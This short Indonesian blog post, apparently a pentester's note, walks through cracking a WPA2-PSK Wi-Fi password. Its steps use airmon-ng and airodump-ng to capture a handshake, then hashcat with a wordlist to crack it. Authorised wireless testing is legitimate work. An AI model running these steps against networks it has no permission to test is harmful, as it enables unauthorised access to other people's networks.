---
title: 'WPA2-PSK Hacking'
date: 2022-11-05 11:30:22 +0700
categories: ['Another Hacking', 'Wifi Pentest']
tags: [wifi, wpa2-psk, dongle]     # TAG names should always be lowercase
author: nairpaa
---

Tujuan dari kegiatan pentest ini adalah mendapatkan password dari wifi dengan keamanan WPA2-PSK.

## 1. Connect Dongle to Kali Linux

Koneksikan [dongle](https://shopee.co.id/Kuwfi-Alfa-AWUS036NH-Wireless-USB-WIFI-Adapter-150-Mbps-RT3070L-Daya-Tinggi-Alfa-Mewah-Adaptor-i.135112867.2112927800) ke Kali Linux via USB:

```bash
# pastikan interface dongle terdeteksi (contoh: wlan0)
➜ ifconfig
```

## 2. Identify Wireless Networks

```bash
# Mengaktifkan mode monitor, biasanya nama interface akan berubah menjadi 'wlan0mon' atau tetap 'wlan0'
➜ airmon-ng start wlan0

# scan wifi, catat channel, mac & bssid 
➜ airodump-ng wlan0

# clone wifi dan tunggu sampai ada WPA handshake wifi
➜ airodump-ng -c <channel> --bssid <bssid> -w <ssid> wlan0
```

![WPA handsake](/assets/img/posts/wpa2-hacking/1.png)

## 3. Convert cap to hc22000

- [Onlinehashcrack](https://www.onlinehashcrack.com/tools-cap-to-hash-converter.php)

![Conver cap to hc22000](/assets/img/posts/wpa2-hacking/2.png)

## 4. Crack the hash

```bash
➜ hashcat -m 22000 pass.hash wordlist.txt
➜ hate_crack pass.hash 22000
```

![Cracking Password](/assets/img/posts/wpa2-hacking/3.png)

---

Referensi:
- https://github.com/ricardojoserf/wpa2-enterprise-attack
- https://purplesec.us/perform-wireless-penetration-test/
- https://tools.kali.org/wireless-attacks/hostapd-wpe